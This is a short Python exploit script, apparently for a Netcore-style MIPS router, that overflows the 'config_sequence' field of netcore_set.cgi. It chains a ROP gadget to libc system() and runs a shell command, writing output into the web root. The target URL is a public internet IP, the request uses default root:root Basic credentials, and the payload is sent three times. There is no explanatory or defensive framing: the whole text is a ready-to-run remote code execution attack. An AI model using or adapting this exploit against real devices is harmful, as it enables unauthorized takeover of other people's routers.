# config_sequence
import requests
from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

libc_base = 0x77f7b000

system = 0x0002A0F0

rop = 0x0001D17C

cmd = b'ls > /web/Config.tgz;'

system_addr = libc_base+system
rop_addr = libc_base+rop

# url = "http://192.168.5.12/cgi-bin-igd/netcore_set.cgi"
url = "http://45.178.100.15:8080/cgi-bin-igd/netcore_set.cgi"

payload = b'A'*139+p32(system_addr)+b'B'*24+p32(rop_addr)+b'C'*24+cmd+b"\x20"*200

data = {"mode_name" : "netcore_set","config_sequence" : payload }

headers = {
    "Upgrade-Insecure-Requests": "1",
    "Connection": "keep-alive",
    "Authorization": "Basic cm9vdDpyb290",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Host": "45.178.100.15:8080"
}


res = requests.post(url = url, headers = headers, data = data)
res = requests.post(url = url, headers = headers, data = data)
res = requests.post(url = url, headers = headers, data = data)

